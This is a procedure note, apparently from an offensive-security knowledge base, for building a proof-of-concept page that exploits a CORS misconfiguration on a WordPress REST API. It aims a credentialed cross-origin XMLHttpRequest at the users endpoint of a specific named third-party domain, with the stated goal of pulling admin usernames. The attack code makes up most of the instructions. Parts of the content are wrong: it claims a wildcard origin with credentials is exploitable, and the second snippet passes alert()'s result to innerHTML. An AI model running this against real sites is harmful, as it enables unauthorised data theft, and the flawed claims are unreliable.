---
tags:
  - cors
  - misconfiguration
  - poc
  - javascript
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/xmlhttprequest-cross-origin-wordpress-api]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:20.448Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 6ea04e56-5454-452a-ab85-53ce35dfc562
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Create-POC-for-CORS-Misconfiguration-Test

## Summary

This procedure creates a proof-of-concept HTML page with JavaScript to test and exploit a CORS misconfiguration on the WordPress REST API, allowing cross-origin retrieval of admin usernames with credentials.

## Description

CORS misconfigurations in WordPress can permit malicious sites to send credentialed requests to the API, exfiltrating data like usernames. The POC uses XMLHttpRequest with withCredentials enabled to simulate an attack from an unauthorized domain. This targets sites where Access-Control-Allow-Origin is set to '*' and credentials are allowed, potentially leading to data theft if a logged-in user visits the malicious page.

## Requirements

1. Text editor to create HTML/JS file
2. Modern web browser for testing
3. Target endpoint accessible (e.g., https://lonestarcell.com/wp-json/wp/v2/users/)

## Defense

Defensive measures and detection strategies:

- Configure CORS to specific origins only (e.g., via .htaccess or plugins)
- Disable credentialed cross-origin requests (Access-Control-Allow-Credentials: false)
- Log and alert on unusual cross-origin API calls

## Objectives

1. Verify CORS policy allows arbitrary origins with credentials
2. Exfiltrate user data cross-origin
3. Demonstrate potential for session-based attacks

## Instructions

### Step 1: Create HTML POC File

**Context**: Build a simple HTML page embedding the JavaScript to perform the cross-origin request.

Create an HTML file with the following structure:

```html
<!DOCTYPE html>
<html>
<body>
<div id="demo">Loading...</div>
<script>
// Insert the XHR command here
var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){ if(this.readyState == 4 && this.status == 200){ document.getElementById("demo").innerHTML = this.responseText; alert(this.responseText); } }; xhr.open("GET", "https://lonestarcell.com/wp-json/wp/v2/users/", true); xhr.withCredentials = true; xhr.send();
</script>
</body>
</html>
```

> Save as poc.html and open in a browser from a different origin (e.g., local file).

### Step 2: Execute and Observe

**Context**: Run the POC to fetch and display the data, confirming exploitation.

**Command** ([[commands/xmlhttprequest-cross-origin-wordpress-api]]):

```javascript
var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function(){ if(this.readyState == 4 && this.status == 200){ document.getElementById("demo").innerHTML = alert(this.responseText); } }; xhr.open("GET", "https://lonestarcell.com/wp-json/wp/v2/users/", true); xhr.withCredentials = true; xhr.send();
```

> This sends a GET request with credentials. Expected: No CORS error, JSON user data alerted, including admin usernames.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/xmlhttprequest-cross-origin-wordpress-api]]

## Tools Used


## Tags

- [[cors]]
- [[poc]]
- [[JavaScript]]
